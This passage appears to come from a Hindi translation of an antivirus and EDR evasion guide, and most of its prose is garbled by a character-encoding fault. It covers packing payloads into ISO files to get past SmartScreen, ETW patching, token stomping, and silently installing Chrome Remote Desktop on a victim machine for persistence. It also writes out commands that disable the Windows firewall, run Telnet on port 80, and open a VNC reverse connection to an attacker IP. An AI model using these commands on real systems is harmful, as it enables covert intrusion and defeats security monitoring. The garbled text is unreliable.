[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рдкреЗрд▓реЛрдб рдХреЛ рдЖрдЙрдЯрдкреБрдЯ рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рдкреИрдХреЗрдЬ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ Mark-of-the-Web рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗред

рдЙрджрд╛рд╣рд░рдг рдЙрдкрдпреЛрдЧ:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд▓реЙрдЧрд┐рдВрдЧ рддрдВрддреНрд░ рд╣реИ рдЬреЛ Windows рдореЗрдВ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдШрдЯрдХреЛрдВ рдХреЛ **рдЗрд╡реЗрдВрдЯреНрд╕ рд▓реЙрдЧ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реБрд░рдХреНрд╖рд╛ рдЙрддреНрдкрд╛рджреЛрдВ рджреНрд╡рд╛рд░рд╛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдФрд░ рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЬреИрд╕реЗ AMSI рдХреЛ рдЕрдХреНрд╖рдо (рдмрд╛рдпрдкрд╛рд╕) рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡реИрд╕реЗ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдерд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ **`EtwEventWrite`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ рдХрд┐рдП рддреБрд░рдВрдд рд▓реМрдЯрдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдореЗрдореЛрд░реА рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкреИрдЪ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рддреБрд░рдВрдд рд▓реМрдЯ рд╕рдХреЗ, рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП ETW рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджреЗрддрд╛ рд╣реИред

рдЖрдк рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) рдФрд░ [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**ред

## C# Assembly Reflection

C# рдмрд╛рдЗрдирд░реА рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХрд░рдирд╛ рдХрд╛рдлреА рд╕рдордп рд╕реЗ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЖрдкрдХреЗ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рдЯреВрд▓реНрд╕ рдХреЛ AV рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝реЗ рдЬрд╛рдиреЗ рдХреЗ рдмрд┐рдирд╛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред

рдЪреВрдВрдХрд┐ рдкреЗрд▓реЛрдб рд╕реАрдзреЗ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдмрд┐рдирд╛ рдбрд┐рд╕реНрдХ рдХреЛ рдЫреБрдП, рд╣рдореЗрдВ рдкреВрд░реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП AMSI рдХреЛ рдкреИрдЪ рдХрд░рдиреЗ рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреА рд╣реЛрдЧреАред

рдЕрдзрд┐рдХрд╛рдВрд╢ C2 рдлреНрд░реЗрдорд╡рд░реНрдХ (sliver, Covenant, metasploit, CobaltStrike, Havoc, рдЖрджрд┐) рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдореЗрдореЛрд░реА рдореЗрдВ рд╕реАрдзреЗ C# рдЕрд╕реЗрдВрдмрд▓реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ:

- **Fork\&Run**

рдЗрд╕рдореЗрдВ **рдПрдХ рдирдпрд╛ рдмрд▓рд┐рджрд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛** рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЕрдкрдиреЗ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдХреЛ рдЙрд╕ рдирдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛, рдЕрдкрдиреЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдФрд░ рдЬрдм рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдП, рддреЛ рдирдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ред рдЗрд╕рдХреЗ рдЕрдкрдиреЗ рд▓рд╛рдн рдФрд░ рд╣рд╛рдирд┐ рд╣реИрдВред рдлреЛрд░реНрдХ рдФрд░ рд░рди рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдпрд╣ рд╣реИ рдХрд┐ рдирд┐рд╖реНрдкрд╛рджрди рд╣рдорд╛рд░реЗ рдмреАрдХрди рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ **рдмрд╛рд╣рд░** рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрджрд┐ рд╣рдорд╛рд░реЗ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреБрдЫ рдЧрд▓рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдкрдХрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╣рдорд╛рд░реЗ **рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рдХреЗ рдЬреАрд╡рд┐рдд рд░рд╣рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрд╣реБрдд рдЕрдзрд┐рдХ рд╣реИред** рд╣рд╛рдирд┐ рдпрд╣ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ **рд╡реНрдпрд╡рд╣рд╛рд░рд╛рддреНрдордХ рдкрд╣рдЪрд╛рди** рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝реЗ рдЬрд╛рдиреЗ рдХреА **рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд╣реЛрддреА рд╣реИред

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

рдпрд╣ рдЕрдкрдиреЗ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдХреЛ **рдЕрдкрдиреЗ рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИред рдЗрд╕ рддрд░рд╣, рдЖрдк рдПрдХ рдирдпрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдиреЗ рдФрд░ AV рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд┐рдП рдЬрд╛рдиреЗ рд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╣рд╛рдирд┐ рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкреЗрд▓реЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рдХреБрдЫ рдЧрд▓рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рдЕрдкрдиреЗ рдмреАрдХрди рдХреЛ рдЦреЛрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрд╣реБрдд рдЕрдзрд┐рдХ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХреНрд░реИрд╢ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> рдпрджрд┐ рдЖрдк C# рдЕрд╕реЗрдВрдмрд▓реА рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдХреГрдкрдпрд╛ рдЗрд╕ рд▓реЗрдЦ рдХреЛ рджреЗрдЦреЗрдВ [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) рдФрд░ рдЙрдирдХреЗ InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

рдЖрдк C# рдЕрд╕реЗрдВрдмрд▓реА рдХреЛ **PowerShell рд╕реЗ рднреА рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) рдФрд░ [S3cur3th1sSh1t рдХрд╛ рд╡реАрдбрд┐рдпреЛ](https://www.youtube.com/watch?v=oe11Q-3Akuk) рджреЗрдЦреЗрдВред

## Using Other Programming Languages

рдЬреИрд╕рд╛ рдХрд┐ [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) рдореЗрдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╣ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рдордЭреМрддрд╛ рдХреА рдЧрдИ рдорд╢реАрди рдХреЛ **рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд SMB рд╢реЗрдпрд░ рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рдЗрдВрдЯрд░рдкреНрд░реЗрдЯрд░ рд╡рд╛рддрд╛рд╡рд░рдг рддрдХ рдкрд╣реБрдВрдЪ** рдорд┐рд▓рддреА рд╣реИред

рдЗрдВрдЯрд░рдкреНрд░реЗрдЯрд░ рдмрд╛рдЗрдирд░реА рдФрд░ SMB рд╢реЗрдпрд░ рдкрд░ рд╡рд╛рддрд╛рд╡рд░рдг рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдХрд░ рдЖрдк **рдЗрди рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рд╕рдордЭреМрддрд╛ рдХреА рдЧрдИ рдорд╢реАрди рдХреА рдореЗрдореЛрд░реА рдореЗрдВ рдордирдорд╛рдирд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

рд░реЗрдкреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ: рдбрд┐рдлреЗрдВрдбрд░ рдЕрднреА рднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди Go, Java, PHP рдЖрджрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ **рд╕реНрдерд┐рд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рд▓рдЪреАрд▓рд╛рдкрди рд╣реИред** рдЗрди рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдЕрди-рдСрдмрдлрд╕реНрдХреЗрдЯреЗрдб рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдкрд░реАрдХреНрд╖рдг рд╕рдлрд▓ рд╕рд╛рдмрд┐рдд рд╣реБрдЖ рд╣реИред

## TokenStomping

Token stomping рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдпрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдЙрддреНрдкрд╛рдж рдЬреИрд╕реЗ EDR рдпрд╛ AV рдХреЛ рд╣реЗрд░рдлреЗрд░ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдЗрд╕рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ рддрд╛рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рди рдорд░реЗ рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдкрд╛рд╕ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐рдпрд╛рдБ рди рд╣реЛрдВред

рдЗрд╕рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП Windows **рдмрд╛рд╣рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ** рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдЯреЛрдХрди рдкрд░ рд╣реИрдВрдбрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИред

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) рдореЗрдВ рд╡рд░реНрдгрд┐рдд рд╣реИ, рдХрд┐рд╕реА рдкреАрд╕реА рдкрд░ Chrome Remote Desktop рдХреЛ рддреИрдирд╛рдд рдХрд░рдирд╛ рдФрд░ рдлрд┐рд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдФрд░ рд╕реНрдерд┐рд░рддрд╛ рдмрдирд╛рдП рд░рдЦрдирд╛ рдЖрд╕рд╛рди рд╣реИ:
1. https://remotedesktop.google.com/ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ, "SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реЗрдЯ рдЕрдк рдХрд░реЗрдВ" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рдлрд┐рд░ Windows рдХреЗ рд▓рд┐рдП MSI рдлрд╝рд╛рдЗрд▓ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
2. рдкреАрдбрд╝рд┐рдд (рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛) рдореЗрдВ рдЪреБрдкрдЪрд╛рдк рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдЪрд▓рд╛рдПрдБ: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop рдкреГрд╖реНрда рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдБ рдФрд░ рдЕрдЧрд▓рд╛ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рд╡рд┐рдЬрд╝рд╛рд░реНрдб рдлрд┐рд░ рдЖрдкрд╕реЗ рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣реЗрдЧрд╛; рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХреГрдд рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдХреБрдЫ рд╕рдорд╛рдпреЛрдЬрдиреЛрдВ рдХреЗ рд╕рд╛рде рджрд┐рдП рдЧрдП рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд┐рди рдкреИрд░рд╛рдореАрдЯрд░ рдЬреЛ GUI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдкрд┐рди рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ)ред

## Advanced Evasion

Evasion рдПрдХ рдмрд╣реБрдд рдЬрдЯрд┐рд▓ рд╡рд┐рд╖рдп рд╣реИ, рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдПрдХ рд╣реА рдкреНрд░рдгрд╛рд▓реА рдореЗрдВ рдХрдИ рд╡рд┐рднрд┐рдиреНрди рдЯреЗрд▓реАрдореЗрдЯреНрд░реА рд╕реНрд░реЛрддреЛрдВ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░рдирд╛ рдкрдбрд╝рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкрд░рд┐рдкрдХреНрд╡ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрджреГрд╢реНрдп рд░рд╣рдирд╛ рд▓рдЧрднрдЧ рдЕрд╕рдВрднрд╡ рд╣реИред

рдЖрдк рдЬрд┐рд╕ рднреА рд╡рд╛рддрд╛рд╡рд░рдг рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░реЗрдВрдЧреЗ, рдЙрд╕рдХреЗ рдЕрдкрдиреЗ рддрд╛рдХрдд рдФрд░ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рд╣реЛрдВрдЧреАред

рдореИрдВ рдЖрдкрдХреЛ [@ATTL4S](https://twitter.com/DaniLJ94) рд╕реЗ рдЗрд╕ рд╡рд╛рд░реНрддрд╛ рдХреЛ рджреЗрдЦрдиреЗ рдХреА рдЕрддреНрдпрдзрд┐рдХ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдБ, рддрд╛рдХрд┐ рдЖрдк рдЕрдзрд┐рдХ рдЙрдиреНрдирдд Evasion рддрдХрдиреАрдХреЛрдВ рдореЗрдВ рдПрдХ рдкреИрд░ рд░рдЦ рд╕рдХреЗрдВред

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

рдпрд╣ [@mariuszbit](https://twitter.com/mariuszbit) рд╕реЗ Evasion in Depth рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдФрд░ рд╢рд╛рдирджрд╛рд░ рд╡рд╛рд░реНрддрд╛ рд╣реИред

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

рдЖрдк [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдмрд╛рдЗрдирд░реА рдХреЗ рднрд╛рдЧреЛрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрдЧрд╛** рдЬрдм рддрдХ рдХрд┐ рдпрд╣ **рдирд╣реАрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рдХрд┐ Defender** рдХрд┐рд╕ рднрд╛рдЧ рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдорд╛рдирддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЖрдкрдХреЗ рд▓рд┐рдП рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддрд╛ рд╣реИред\
рдПрдХ рдФрд░ рдЙрдкрдХрд░рдг рдЬреЛ **рд╕рдорд╛рди рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ рд╡рд╣ рд╣реИ** [**avred**](https://github.com/dobin/avred) рдЬрд┐рд╕рдореЗрдВ [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) рдкрд░ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред

### **Telnet Server**

Windows10 рддрдХ, рд╕рднреА Windows рдореЗрдВ рдПрдХ **Telnet рд╕рд░реНрд╡рд░** рд╣реЛрддрд╛ рдерд╛ рдЬрд┐рд╕реЗ рдЖрдк (рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ) рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рдереЗ:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
рд╕рд┐рд╕реНрдЯрдо рд╢реБрд░реВ рд╣реЛрдиреЗ рдкрд░ рдЗрд╕реЗ **рд╢реБрд░реВ** рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдЕрднреА **рдЪрд▓рд╛рдПрдВ**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**рдЯреЗрд▓рдиреЗрдЯ рдкреЛрд░реНрдЯ рдмрджрд▓реЗрдВ** (рдЫрд┐рдкрд╛ рд╣реБрдЖ) рдФрд░ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдмрдВрдж рдХрд░реЗрдВ:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (рдЖрдкрдХреЛ рдмрд┐рди рдбрд╛рдЙрдирд▓реЛрдб рдЪрд╛рд╣рд┐рдП, рд╕реЗрдЯрдЕрдк рдирд╣реАрдВ)

**HOST рдкрд░**: _**winvnc.exe**_ рдХреЛ рдЪрд▓рд╛рдПрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ:

- рд╡рд┐рдХрд▓реНрдк _Disable TrayIcon_ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ
- _VNC Password_ рдореЗрдВ рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ
- _View-Only Password_ рдореЗрдВ рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ

рдлрд┐рд░, рдмрд╛рдЗрдирд░реА _**winvnc.exe**_ рдФрд░ **рдирдП** рдмрдирд╛рдП рдЧрдП рдлрд╝рд╛рдЗрд▓ _**UltraVNC.ini**_ рдХреЛ **victim** рдХреЗ рдЕрдВрджрд░ рд▓реЗ рдЬрд╛рдПрдВ

#### **Reverse connection**

**attacker** рдХреЛ рдЕрдкрдиреЗ **host** рдХреЗ рдЕрдВрджрд░ рдмрд╛рдЗрдирд░реА `vncviewer.exe -listen 5900` рдЪрд▓рд╛рдиреА рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдпрд╣ рдПрдХ рд░рд┐рд╡рд░реНрд╕ **VNC connection** рдкрдХрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП **рддреИрдпрд╛рд░** рд╣реЛ рд╕рдХреЗред рдлрд┐рд░, **victim** рдХреЗ рдЕрдВрджрд░: winvnc рдбреЗрдорди `winvnc.exe -run` рд╢реБрд░реВ рдХрд░реЗрдВ рдФрд░ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` рдЪрд▓рд╛рдПрдВ

**WARNING:** рд╕реНрдЯреЗрд▓реНрде рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреБрдЫ рдЪреАрдЬреЗрдВ рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП

